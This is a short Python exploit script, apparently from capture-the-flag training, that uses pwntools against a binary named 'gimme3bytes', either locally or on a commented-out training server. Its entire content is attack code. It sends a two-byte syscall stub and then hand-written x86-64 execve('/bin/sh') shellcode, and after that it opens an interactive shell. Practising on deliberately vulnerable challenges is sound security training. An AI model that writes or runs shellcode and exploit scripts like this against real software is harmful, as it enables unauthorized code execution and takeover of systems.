from pwn import *
import time
context.terminal = ['tmux', 'splitw', '-h']

#ssh = ssh("acidburn", "10.0.2.15:22")
r = process("./gimme3bytes")
#r = remote("training.jinblack.it", 2004)

gdb.attach(r , """b main
	""")

payload = b"\x0f\x05"

shellcode = b"\xEB\x14\x5F\x48\x89\xFE\x48\x83\xC6\x08\x48\x89\xF2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05\xE8\xE7\xFF\xFF\xFF"
shellcode = shellcode + b"/bin/sh\x00" + b"\x00"*8

r.send(payload)
time.sleep(0.2)

r.send(shellcode)
time.sleep(0.2)

r.interactive()
